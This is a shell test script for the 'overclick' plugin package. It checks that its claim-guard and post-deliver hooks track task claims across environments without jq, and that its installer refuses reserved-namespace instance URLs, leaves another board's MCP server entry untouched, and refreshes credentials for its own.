printf '%s' "$release_input" | PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test ! -e "$TEST_ROOT/project/.overclick/claim.json"

mkdir -p "$TEST_ROOT/project-python"
python_claim_input=$(jq -nc --arg cwd "$TEST_ROOT/project-python" '{cwd:$cwd,session_id:"python-session",tool_name:"task_claim",tool_input:{task_id:"T-2"},tool_response:{structuredContent:{task:{short_id:"T-2",status:"em_execucao"},attempt:{started_at:"2026-08-19T12:30:00.000Z"}}}}')
printf '%s' "$python_claim_input" | PATH="$TEST_ROOT/nojq" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test -f "$TEST_ROOT/project-python/.overclick/claim.json"
python_write_input=$(jq -nc --arg cwd "$TEST_ROOT/project-python" '{cwd:$cwd,session_id:"python-session",tool_name:"Write",tool_input:{file_path:"changed.txt",content:"fixture"}}')
test -z "$(printf '%s' "$python_write_input" | PATH="$TEST_ROOT/nojq" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")"
python_deliver_input=$(jq -nc --arg cwd "$TEST_ROOT/project-python" '{cwd:$cwd,session_id:"python-session",tool_name:"task_deliver",tool_input:{task_id:"T-2"}}')
printf '%s' "$python_deliver_input" | PATH="$TEST_ROOT/nojq" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test ! -e "$TEST_ROOT/project-python/.overclick/claim.json"

mkdir -p "$TEST_ROOT/project-node"
node_claim_input=$(jq -nc --arg cwd "$TEST_ROOT/project-node" '{cwd:$cwd,session_id:"node-session",tool_name:"task_claim",tool_input:{task_id:"T-3"},tool_response:{structuredContent:{task:{short_id:"T-3",status:"em_execucao"},attempt:{started_at:"2026-08-19T13:00:00.000Z"}}}}')
printf '%s' "$node_claim_input" | PATH="$TEST_ROOT/nojq-node" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test -f "$TEST_ROOT/project-node/.overclick/claim.json"
node_write_input=$(jq -nc --arg cwd "$TEST_ROOT/project-node" '{cwd:$cwd,session_id:"node-session",tool_name:"Write",tool_input:{file_path:"changed.txt",content:"fixture"}}')
test -z "$(printf '%s' "$node_write_input" | PATH="$TEST_ROOT/nojq-node" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")"
node_deliver_input=$(jq -nc --arg cwd "$TEST_ROOT/project-node" '{cwd:$cwd,session_id:"node-session",tool_name:"task_deliver",tool_input:{task_id:"T-3"}}')
printf '%s' "$node_deliver_input" | PATH="$TEST_ROOT/nojq-node" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test ! -e "$TEST_ROOT/project-node/.overclick/claim.json"

mkdir -p "$TEST_ROOT/git/remote.git" "$TEST_ROOT/git/work"
git init --bare "$TEST_ROOT/git/remote.git" >/dev/null 2>&1
git -C "$TEST_ROOT/git/work" init >/dev/null 2>&1
git -C "$TEST_ROOT/git/work" config user.name fixture
git -C "$TEST_ROOT/git/work" config user.email fixture@invalid
touch "$TEST_ROOT/git/work/file"
git -C "$TEST_ROOT/git/work" add file
git -C "$TEST_ROOT/git/work" commit -m fixture >/dev/null 2>&1
git -C "$TEST_ROOT/git/work" remote add origin "$TEST_ROOT/git/remote.git"
git -C "$TEST_ROOT/git/work" push -u origin HEAD >/dev/null 2>&1
commit=$(git -C "$TEST_ROOT/git/work" rev-parse HEAD)
(cd "$TEST_ROOT/git/work" && printf '{"tool_input":{"evidence":[{"text":"commit %s"}]}}' "$commit" | "$REPO_ROOT/plugin/hooks/post-deliver.sh")

# OCL-114, the shape of the original failure: a run pointed at a reserved,
# unresolvable namespace baked that host into the agent configs and every agent
# that read them concluded the board was down. It has to be refused up front.
if PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/reserved-native.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-reserved" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$(printf '%s%s%s' 'https' '://' 'board.invalid')" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/reserved.out" 2>"$TEST_ROOT/reserved.err"; then
  echo "installer accepted an instance URL in a reserved namespace" >&2
  exit 1
fi
grep -Fq 'reserved namespace' "$TEST_ROOT/reserved.err"
test ! -e "$TEST_ROOT/home-reserved/.config/overclick/config"
test ! -e "$TEST_ROOT/reserved-native.log"

# A server already named `overclick` and pointing somewhere else is somebody's
# working board. Installing must not take the name over: no remove, no add.
PATH="$TEST_ROOT/bin:$PATH" \
OC_TEST_NATIVE_LOG="$TEST_ROOT/collision-native.log" \
OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
OC_TEST_EXISTING_MCP="$(printf '%s%s%s' 'https' '://' 'other-board.internal/mcp')" \
OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-collision" \
OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
OVERCLICK_TOKEN="fixture" \
OVERCLICK_CLIS="claude" \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/collision.out" 2>"$TEST_ROOT/collision.err"
grep -Fq 'left untouched' "$TEST_ROOT/collision.err"
test "$(grep -c '^claude:mcp:remove$' "$TEST_ROOT/collision-native.log" || true)" -eq 0
test "$(grep -c '^mcp-url:' "$TEST_ROOT/collision-native.log" || true)" -eq 0

# The same server pointing at THIS instance is just a credential refresh, so a
# re-run must still rewrite it rather than skip it.
PATH="$TEST_ROOT/bin:$PATH" \
OC_TEST_NATIVE_LOG="$TEST_ROOT/refresh-native.log" \
OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
OC_TEST_EXISTING_MCP="$FIXTURE_URL/mcp" \
OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-refresh" \
OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
OVERCLICK_TOKEN="fixture" \
OVERCLICK_CLIS="claude" \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/refresh.out" 2>"$TEST_ROOT/refresh.err"
grep -Fq "mcp-url:$FIXTURE_URL/mcp" "$TEST_ROOT/refresh-native.log"

echo "plugin package checks passed"
